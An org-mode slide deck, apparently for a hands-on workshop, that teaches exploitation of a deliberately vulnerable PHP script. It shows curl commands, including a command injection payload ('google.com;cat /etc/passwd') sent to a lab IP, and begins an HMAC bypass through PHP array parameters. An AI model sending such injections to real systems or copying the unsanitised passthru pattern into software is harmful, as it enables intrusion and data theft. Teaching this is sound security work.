2022-02-03/Presentation.org
** Source code: Authentication and execution
#+BEGIN_SRC php
    $secret = getenv("SECRET");

    if (isset($_POST['nonce']))
        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);

    $hmac = hash_hmac('sha256', $_POST['host'], $secret);

    if ($hmac !== $_POST['hmac']) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }

    echo passthru("host ".$_POST['host']);
#+END_SRC

** Step 0: Identify host
#+ATTR_REVEAL: :frag appear
10.104.58.39

#+ATTR_REVEAL: :frag appear
Join in! [[http://10.104.58.39/ui.php]]

** Step 1: Normal Usage
#+ATTR_REVEAL: :frag fade-in-and-out
What's "normal"?

*** Usage 1:
- host: ~google.com~
- hmac: ~ad1663b82d5bdb2e1938...~

*** Usage 2:
- host: ~google.com~
- nonce: ~STUPID_NONCE~
- hmac: ~b3700dedb181ee312930...~

*** Command
#+BEGIN_NOTES
Execute command below:

[[shell:curl --data "host=google.com&hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1]]
#+END_NOTES

#+BEGIN_SRC bash
curl --data "host=google.com&hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 10.104.58.39
#+END_SRC

** What functions are being called and variables used?
#+BEGIN_SRC php
    $secret = getenv("SECRET");

    if (isset($_POST['nonce']))
        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);

    $hmac = hash_hmac('sha256', $_POST['host'], $secret);

    if ($hmac !== $_POST['hmac']) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }

    echo passthru("host ".$_POST['host']);
#+END_SRC

#+ATTR_REVEAL: :frag appear
- [[https://www.php.net/manual/en/function.getenv.php][~getenv~]]
#+ATTR_REVEAL: :frag appear
- [[https://www.php.net/manual/en/function.isset.php][~isset~]]
#+ATTR_REVEAL: :frag appear
- [[https://www.php.net/manual/en/reserved.variables.post.php][~$_POST~]]
#+ATTR_REVEAL: :frag appear
- [[https://www.php.net/manual/en/function.hash-hmac.php][~hash_hmac~]]
#+ATTR_REVEAL: :frag appear
- [[https://www.php.net/manual/en/function.header.php][~header~]]
#+ATTR_REVEAL: :frag appear
- [[https://www.php.net/manual/en/function.passthru.php][~passthru~]]

** Step 2: Bash Injection
Is ~passthru~ vulnerable to shell injections?
#+ATTR_REVEAL: :frag appear
Yes!

*** Example usage:
- host: ~google.com;cat /etc/passwd~
- hmac: ~84e26d8e32086e127a60...~

*** Command
#+BEGIN_NOTES
Execute command below:

[[shell:curl --data "host=google.com;cat /etc/passwd&hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1]]
#+END_NOTES

#+BEGIN_SRC bash
curl --data "host=google.com;cat /etc/passwd&hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 10.104.58.39
#+END_SRC

** Step 3: HMAC Circumvention
What else is vulnerable in the code above?
#+ATTR_REVEAL: :frag appear
Is there anything magic that happens, a "feature"?

*** Did you catch it?
#+ATTR_REVEAL: :frag appear
"One feature of PHP's processing of POST and GET variables is that it automatically decodes indexed form variable names."

#+ATTR_REVEAL: :frag appear
What does this do to the types of variables used?

*** Some PHP analysis
#+ATTR_REVEAL: :frag appear
- ~element[]~: 1
- ~element[]~: 2

#+ATTR_REVEAL: :frag appear
#+BEGIN_SRC php
<?php
    var_dump($_POST);

    // array(1) {
    //     ["element"] => array(2) {
    //         [0] => string(1) "1"
    //         [1] => string(2) "2"
    //     }
    // }
#+END_SRC

